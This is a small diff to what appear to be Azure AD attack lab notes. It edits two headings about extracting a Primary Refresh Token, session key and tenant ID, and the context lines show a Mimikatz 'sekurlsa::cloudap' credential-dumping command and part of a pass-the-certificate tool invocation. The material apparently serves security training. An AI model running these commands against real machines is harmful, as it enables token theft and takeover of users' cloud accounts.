@@ -22,7 +22,7 @@
 dsregcmd /status
 ```
 
-#### Extract PRT, Session key and Tenant ID
+#### Extract PRT, Session key (keyvalue) and Tenant ID
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 ```
@@ -49,7 +49,7 @@ python C:\Users\vmuser\Documents\student38\AzureADJoinedMachinePTC\Main.py --use
 #### Use psremoting to access the machine
 
 ## Pass the PRT
-#### Extract PRT, Session key and Tenant ID
+#### Extract PRT, Session key (keyvalue) and Tenant ID
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 ```
